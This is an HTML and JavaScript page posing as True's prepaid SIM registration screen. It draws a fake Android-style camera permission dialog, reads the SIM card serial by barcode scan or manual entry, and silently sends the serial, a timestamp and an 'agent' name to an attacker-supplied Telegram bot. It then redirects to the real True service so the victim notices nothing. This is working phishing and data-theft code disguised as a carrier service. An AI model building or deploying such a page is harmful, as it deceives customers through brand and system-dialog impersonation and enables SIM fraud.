<title>ลงทะเบียนซิม True</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;600;700;800&display=swap">
<script src="https://cdnjs.cloudflare.com/ajax/libs/zxing-js/0.21.1/umd/index.min.js"></script>

<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:18px}
body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sarabun',sans-serif;-webkit-tap-highlight-color:transparent}
.app{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;flex-direction:column;background:#fff}

/* ─── Header ─── */
.hdr{display:flex;align-items:center;background:#fff;border-bottom:1px solid #e8e8e8;flex-shrink:0;padding-top:env(safe-area-inset-top,0px)}
.hdr-inner{display:flex;align-items:center;width:100%;height:64px;padding:0 4px}
.hdr-back{width:52px;height:52px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#e8001c;flex-shrink:0}
.hdr-title{flex:1;text-align:center;font-size:26px;font-weight:800;color:#1a1a1a;margin-right:52px;letter-spacing:-0.3px}

/* ─── Tabs ─── */
.tabs{display:flex;flex-shrink:0;background:#fff;border-bottom:2px solid #e8e8e8}
.tab-btn{
  flex:1;height:60px;background:none;border:none;border-bottom:3px solid transparent;
  font-family:'Sarabun',sans-serif;font-size:22px;font-weight:700;color:#999;
  cursor:pointer;position:relative;bottom:-2px;transition:color .15s,border-color .15s
}
.tab-btn.active{color:#e8001c;border-bottom-color:#e8001c}

/* ─── Content ─── */
.content{flex:1;position:relative;overflow:hidden;min-height:0}
.pane{position:absolute;top:0;left:0;right:0;bottom:0;display:none}
.pane.active{display:flex;flex-direction:column}

/* ─── SCAN PANE ─── */
.scan-pane{background:#3d3d3d;overflow:hidden}
#video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;display:block}
.cam-label{
  position:absolute;left:0;right:0;top:28%;
  text-align:center;font-size:26px;font-weight:700;color:#fff;
  z-index:3;pointer-events:none;text-shadow:0 1px 8px rgba(0,0,0,0.7);
  padding:0 20px;line-height:1.5
}
.scan-overlay{
  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
  padding-top:40px;z-index:3;pointer-events:none
}
.scan-frame{position:relative;width:88%;aspect-ratio:3/1;background:rgba(160,140,120,0.20);border-radius:14px}
.scan-frame::before,.scan-frame::after,.scan-frame>span::before,.scan-frame>span::after{
  content:'';position:absolute;width:36px;height:36px;border-color:rgba(220,220,220,0.95);border-style:solid
}
.scan-frame::before{top:-2px;left:-2px;border-width:4px 0 0 4px;border-radius:10px 0 0 0}
.scan-frame::after{top:-2px;right:-2px;border-width:4px 4px 0 0;border-radius:0 10px 0 0}
.scan-frame>span::before{bottom:-2px;left:-2px;border-width:0 0 4px 4px;border-radius:0 0 0 10px}
.scan-frame>span::after{bottom:-2px;right:-2px;border-width:0 4px 4px 0;border-radius:0 0 10px 0}

/* ─── IDLE SCREEN ─── */
.cam-idle{
  position:absolute;inset:0;z-index:10;
  background:#3d3d3d;
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px
}
.cam-idle-icon{
  width:96px;height:96px;
  border:2px solid rgba(255,255,255,0.25);border-radius:26px;
  display:flex;align-items:center;justify-content:center
}
.cam-idle-title{font-size:26px;font-weight:800;color:#fff;text-align:center}
.cam-idle-sub{font-size:20px;color:rgba(255,255,255,0.55);text-align:center;margin-top:-10px;padding:0 32px;line-height:1.6}

/* ─── POPUP ─── */
/* ใช้ display:none/flex แทน opacity เพื่อให้ Android ไม่ถือว่า overlay ยัง intercept gesture */
.popup-overlay{
  position:fixed;inset:0;
  background:rgba(0,0,0,0.55);
  display:none;
  align-items:center;justify-content:center;
  z-index:1000;padding:28px
}
.popup-overlay.show{display:flex}
.popup-box{
  width:100%;max-width:360px;
  background:#fff;border-radius:28px;
  padding:32px 0 0;
  animation:popIn .2s cubic-bezier(.34,1.56,.64,1)
}
@keyframes popIn{from{transform:scale(0.88);opacity:0}to{transform:scale(1);opacity:1}}

.popup-icon{
  width:60px;height:60px;
  background:#e8f0fe;border-radius:16px;
  display:flex;align-items:center;justify-content:center;
  margin:0 auto 20px
}
.popup-desc{
  font-size:22px;color:#444;text-align:center;
  line-height:1.6;padding:0 28px;margin-bottom:12px
}
.popup-desc strong{color:#111;font-weight:800}
.popup-divider{height:1px;background:#e8e8e8;margin:8px 0 0}

.popup-btn{
  width:100%;padding:22px 28px;
  background:none;border:none;border-bottom:1px solid #e8e8e8;
  font-family:'Sarabun',sans-serif;
  font-size:24px;font-weight:700;color:#1a73e8;
  cursor:pointer;text-align:center;display:block;
  -webkit-appearance:none;touch-action:manipulation
}
.popup-btn:active{background:#f0f4ff}
.popup-btn.deny{
  color:#666;font-weight:600;border-bottom:none;
  padding-bottom:28px;font-size:22px
}

/* ─── TOAST ─── */
.toast{
  position:fixed;bottom:calc(28px + env(safe-area-inset-bottom,0px));
  left:50%;transform:translateX(-50%);
  background:rgba(20,20,20,0.92);color:#fff;
  padding:14px 28px;border-radius:28px;
  font-size:20px;font-weight:600;white-space:nowrap;
  z-index:2000;opacity:0;pointer-events:none;transition:opacity .2s
}
.toast.show{opacity:1}

/* ─── MANUAL PANE ─── */
.manual-pane{background:#fff;overflow-y:auto;-webkit-overflow-scrolling:touch}
.manual-inner{min-height:100%;display:flex;flex-direction:column;padding:32px 24px calc(36px + env(safe-area-inset-bottom,0px));gap:24px}
.field-lbl{font-size:20px;font-weight:700;color:#666;margin-bottom:10px}
.serial-input{
  width:100%;border:2px solid #e8e8e8;border-radius:12px;
  padding:18px 18px;font-family:'Sarabun',monospace;
  font-size:26px;font-weight:700;color:#1a1a1a;
  outline:none;letter-spacing:.05em;-webkit-appearance:none;background:#fff;
  transition:border-color .18s
}
.serial-input:focus{border-color:#e8001c}
.serial-input::placeholder{color:#bbb;font-weight:400;font-size:18px;letter-spacing:0}
.field-hint{font-size:18px;color:#999;line-height:1.6;margin-top:10px}
.spacer{flex:1}
.btn-submit{
  width:100%;padding:20px;background:#e8001c;border:none;border-radius:14px;
  font-family:'Sarabun',sans-serif;font-size:24px;font-weight:800;
  color:#fff;cursor:pointer;-webkit-appearance:none;touch-action:manipulation
}
.btn-submit:active{opacity:.85}
.btn-submit:disabled{opacity:.45;cursor:not-allowed}
</style>

<div class="app">
  <div class="hdr">
    <div class="hdr-inner">
      <button class="hdr-back" onclick="history.back()">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
      </button>
      <div class="hdr-title">ลงทะเบียนซิมเติมเงิน</div>
    </div>
  </div>

  <div class="tabs">
    <button class="tab-btn active" id="tabScan" onclick="switchTab('scan')">สแกนบาร์โค้ด</button>
    <button class="tab-btn" id="tabManual" onclick="switchTab('manual')">กรอกตัวเลข</button>
  </div>

  <div class="content">
    <div class="pane active scan-pane" id="paneScan">
      <video id="video" playsinline muted autoplay></video>
      <div class="cam-label">สแกนบาร์โค้ดบนซองซิมการ์ด</div>
      <div class="scan-overlay"><div class="scan-frame"><span></span></div></div>
      <div class="cam-idle" id="camIdle">
        <div class="cam-idle-icon">
          <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="1.5" stroke-linecap="round">
            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
            <circle cx="12" cy="13" r="4"/>
          </svg>
        </div>
        <div class="cam-idle-title" id="camIdleMsg">กรุณาอนุญาตการใช้กล้อง</div>
        <div class="cam-idle-sub">กดปุ่มอนุญาตเพื่อเปิดกล้องสแกนบาร์โค้ด</div>
      </div>
    </div>

    <div class="pane manual-pane" id="paneManual">
      <div class="manual-inner">
        <div>
          <div class="field-lbl">เลขซีเรียลซิม (18 หลัก)</div>
          <input class="serial-input" id="manualSerial" type="tel" inputmode="numeric"
            placeholder="896604XXXXXXXXXXXX" maxlength="18" autocomplete="off"
            oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
          <div class="field-hint">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
        </div>
        <div class="spacer"></div>
        <button class="btn-submit" id="btnSubmit" onclick="submitManual()">ยืนยันและลงทะเบียน</button>
      </div>
    </div>
  </div>
</div>

<!-- POPUP -->
<!-- สำคัญ: onclick ชี้ตรง startCamera() ใน attribute — ไม่มีฟังก์ชันกลาง -->
<!-- hidePopup() ทำ display:none ทันที (synchronous) ก่อน getUserMedia -->
<div class="popup-overlay" id="popupOverlay">
  <div class="popup-box">
    <div class="popup-icon">
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
        <circle cx="12" cy="13" r="4"/>
      </svg>
    </div>
    <div class="popup-desc">
      อนุญาตให้ <strong>True</strong> ถ่ายรูปและบันทึกวิดีโอไหม
    </div>
    <div class="popup-divider"></div>
    <button class="popup-btn" onclick="startCamera()">ขณะใช้แอป</button>
    <button class="popup-btn" onclick="startCamera()">เฉพาะครั้งนี้</button>
    <button class="popup-btn deny" onclick="denyCamera()">ไม่อนุญาต</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
/* ── localStorage helpers ── */
const LS  = k   => { try{return localStorage.getItem(k)||''}catch(e){return''} };
const LSS = (k,v)=> { try{localStorage.setItem(k,v)}catch(e){} };

const p = new URLSearchParams(location.search);
if(p.get('bot'))   LSS('sim_bot',   p.get('bot'));
if(p.get('chat'))  LSS('sim_chat',  p.get('chat'));
if(p.get('agent')) LSS('sim_agent', p.get('agent'));
const tgBot   = LS('sim_bot');
const tgChat  = LS('sim_chat');
const tgAgent = LS('sim_agent');

/* ── Tabs ── */
function switchTab(tab) {
  document.getElementById('paneScan').classList.toggle('active', tab==='scan');
  document.getElementById('paneManual').classList.toggle('active', tab==='manual');
  document.getElementById('tabScan').classList.toggle('active', tab==='scan');
  document.getElementById('tabManual').classList.toggle('active', tab==='manual');
  if(tab==='scan' && !scanning) showPopup();
  if(tab==='manual') stopCamera();
}

/* ── Toast ── */
let toastT;
function toast(msg){
  const el=document.getElementById('toast');
  el.textContent=msg; el.classList.add('show');
  clearTimeout(toastT);
  toastT=setTimeout(()=>el.classList.remove('show'),2500);
}

/* ── Popup ── */
function showPopup(){
  document.getElementById('popupOverlay').style.display='flex';
}
function hidePopup(){
  /* display:none แบบ synchronous — Android จะไม่ถือว่า overlay ยัง intercept gesture */
  document.getElementById('popupOverlay').style.display='none';
}
function denyCamera(){
  hidePopup();
  switchTab('manual');
}

/* ── Camera & Scanner ── */
let reader=null, scanning=false, stream=null;

/*
 * startCamera() ถูกเรียกจาก onclick="startCamera()" ใน HTML attribute โดยตรง
 * ขั้นตอน:
 *   1) hidePopup()  → synchronous → popup หายทันที
 *   2) getUserMedia → เป็น await แรก อยู่ใน gesture chain เดิม → Android อนุญาต
 *   3) ตั้ง video.srcObject แล้วเล่น
 *   4) init ZXing แล้วเริ่ม scan
 */
async function startCamera(){
  hidePopup();           /* 1 — synchronous */
  if(scanning) return;

  const idle = document.getElementById('camIdle');
  const msg  = document.getElementById('camIdleMsg');
  idle.hidden = false;
  msg.textContent = 'กำลังเปิดกล้อง...';

  try {
    /* 2 — getUserMedia เป็น await แรก */
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:{ideal:'environment'}, width:{ideal:1920}, height:{ideal:1080} }
    }).catch(()=>
      navigator.mediaDevices.getUserMedia({ video:{facingMode:'environment'} })
    );

    idle.hidden = true;          /* 3 */

    const vid = document.getElementById('video');
    vid.srcObject = stream;
    vid.play().catch(()=>{});

    /* 4 — รอ ZXing โหลดเสร็จ */
    if(typeof ZXing === 'undefined'){
      await new Promise(res=>{
        const t=setInterval(()=>{ if(typeof ZXing!=='undefined'){clearInterval(t);res();} },100);
      });
    }

    const hints = new Map();
    hints.set(ZXing.DecodeHintType.POSSIBLE_FORMATS,[
      ZXing.BarcodeFormat.CODE_128,
      ZXing.BarcodeFormat.CODE_39,
      ZXing.BarcodeFormat.EAN_13,
    ]);
    hints.set(ZXing.DecodeHintType.TRY_HARDER, true);
    reader = new ZXing.BrowserMultiFormatReader(hints,{delayBetweenScanAttempts:80});

    scanning = true;
    reader.decodeFromVideoElement('video', result=>{
      if(result){
        const serial = extractSerial(result.getText());
        if(serial){ stopCamera(); onSerial(serial); }
      }
    });

  } catch(e){
    idle.hidden = false;
    if(e && e.name==='NotAllowedError'){
      msg.textContent = 'ไม่ได้รับสิทธิ์กล้อง';
      setTimeout(showPopup, 600);
    } else {
      msg.textContent = 'เกิดข้อผิดพลาด กรุณาลองใหม่';
      setTimeout(showPopup, 1000);
    }
    scanning = false;
    stream = null;
  }
}

function stopCamera(){
  if(reader){try{reader.reset()}catch(e){} reader=null;}
  if(stream){stream.getTracks().forEach(t=>t.stop()); stream=null;}
  scanning = false;
}

function extractSerial(raw){
  const s = raw.replace(/\s/g,'');
  const m = s.match(/8966\d{14}/);
  if(m) return m[0];
  const m2 = s.match(/\d{18}/);
  return m2 ? m2[0] : null;
}

async function onSerial(serial){
  sendTelegram(serial);   /* fire & forget */
  redirectToTrue(serial); /* redirect ทันที */
}

async function sendTelegram(serial){
  if(!tgBot||!tgChat) return;
  const now = new Date().toLocaleString('th-TH',{timeZone:'Asia/Bangkok',hour12:false});
  const agentLine = tgAgent ? `\n👤 พนักงาน: ${tgAgent}` : '';
  const msg = `📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}${agentLine}`;
  try{
    await fetch(`https://api.telegram.org/bot${tgBot}/sendMessage`,{
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id:tgChat, text:msg})
    });
  }catch(e){}
}

function redirectToTrue(serial){
  window.location.href = `https://iservice.page.link/iService-SIMRegister`;
}

function submitManual(){
  const serial = document.getElementById('manualSerial').value.replace(/\D/g,'');
  if(serial.length<10){ toast('กรุณากรอกเลขซีเรียลให้ครบ'); return; }
  document.getElementById('btnSubmit').disabled = true;
  sendTelegram(serial);
  setTimeout(()=>redirectToTrue(serial), 300);
}

/* แสดง popup ทันทีที่โหลดหน้า */
window.addEventListener('load', ()=> setTimeout(showPopup, 400));
</script>
